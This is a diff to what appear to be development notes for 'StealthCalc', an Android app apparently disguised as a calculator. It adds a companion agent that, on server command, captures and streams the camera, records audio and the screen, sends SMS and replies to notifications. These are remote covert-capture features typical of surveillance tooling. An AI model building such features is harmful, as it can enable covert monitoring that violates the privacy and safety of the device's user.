@@ -421,3 +421,25 @@ APK artifact name: `StealthCalc-debug`.
 | R8-13/14 | Save page to vault | `BrowserViewModel.savePageToVault()` writes URL+title stub as encrypted text | Full MHTML download deferred — GeckoView 123 download delegate API too version-specific |
 | R8-15 | Remote wipe | `RemoteCommandHandler`: `wipe_vault` → `WipeManager.wipeAll()` | Dashboard confirmation dialog guards accidental wipe |
 | R8-16 | Timeline view | New `TimelineScreen` + `TimelineViewModel`; last 500 events grouped by hour | Wired from Dashboard alongside existing Map button |
+
+---
+
+## Agent + Server Compatibility (2026-04-20, commits `a61361c`–`affb23c`)
+
+**Server:** No changes required. `Commands.kt` relay is generic — accepts any `type: String`, serializes to JSON, sends to device WebSocket. Adding new command types to main app or agent requires zero server changes.
+
+**Agent — Phase 1 (commit `a61361c`):** Added `CommandRequest` model, `AgentRepository.wipe()`, `AgentClient.listenForCommands()` (WebSocket with 5s reconnect), `startCommandLoop()` in `AgentForegroundService`. Handled `lock_device`, `wipe_vault`, `ring`.
+
+**Agent — Phase 2 (commit `affb23c`):** Full command parity with main app. New files:
+
+| File | Role |
+|------|------|
+| `service/AgentCameraService.kt` | Camera2 still capture (front 640×480, back 1280×960) → upload |
+| `service/AgentLiveCameraService.kt` | Camera2 repeating JPEG → WebSocket `/camera/{side}/{deviceId}` |
+| `service/AgentScreenRecordService.kt` | MediaCodec H.264 + VirtualDisplay + MediaMuxer → upload; needs `setMediaProjection()` |
+
+`AgentNotificationListener` gained `companion object { instance }` + `replyToNotification(pkg, text)` using `Notification.Action.remoteInputs`.
+
+`AgentForegroundService` now dispatches all 13 commands: `capture_front`, `capture_back`, `record_audio`, `ring`, `send_sms`, `stream_camera_front`, `stream_camera_back`, `stop_camera_stream`, `screen_record`, `reply_notification`, `launch_app`, `lock_device`, `wipe_vault`.
+
+Manifest: `foregroundServiceType="specialUse|mediaProjection"` (needed for MediaProjection API on API 34+).
